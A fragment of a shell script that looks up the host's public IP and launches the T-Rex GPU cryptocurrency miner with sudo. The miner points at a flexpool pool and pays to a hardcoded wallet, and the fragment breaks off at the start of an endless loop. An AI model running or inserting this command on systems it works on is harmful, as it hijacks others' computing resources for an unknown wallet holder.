...
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p x -w $ip --keep-gpu-busy 
while [ 1 ]; do
